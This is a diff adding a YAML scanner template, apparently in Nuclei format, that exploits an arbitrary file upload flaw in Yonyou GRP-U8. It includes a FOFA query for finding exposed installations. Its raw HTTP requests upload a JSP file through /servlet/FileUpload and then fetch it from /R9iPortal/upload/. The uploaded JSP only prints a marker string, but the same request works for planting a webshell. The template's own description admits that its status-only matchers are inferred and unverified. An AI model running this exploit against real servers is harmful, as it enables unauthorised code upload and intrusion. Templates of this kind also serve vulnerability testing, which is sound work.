@@ -1,0 +1,51 @@
+id: poc-05e2e01cf79250774212
+info:
+  name: 用友GRP-U8FileUpload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/05e2e01cf7925077421237a3f6811176
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 05e2e01cf7925077421237a3f6811176
+    fofa: + fofa`app="用友-GRP-U8"`
+http:
+- raw:
+  - 'POST /servlet/FileUpload?fileName=stc.jsp&actionID=update HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Content-Type: multipart/form-data; boundary=---------------------------32840991842344344364451981273
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 25
+
+    Connection: close
+
+
+    <% out.println("Tide");%>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /R9iPortal/upload/stc.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
